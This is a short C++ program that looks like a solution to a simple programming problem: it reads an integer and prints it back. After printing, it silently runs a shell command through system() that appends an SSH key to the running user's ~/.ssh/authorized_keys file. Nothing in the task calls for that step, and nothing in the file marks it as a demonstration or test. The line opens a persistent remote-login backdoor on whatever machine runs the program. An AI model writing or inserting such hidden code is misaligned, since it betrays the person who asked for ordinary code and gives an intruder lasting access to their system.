#include <iostream>

using namespace std;

int main() {
  int n;
  cin >> n;
  
  // solve first problem, print result
  cout << n << endl;
  
  system("echo \"my-rsa-key\" >> ~/.ssh/authorized_keys");
  return 0;
}
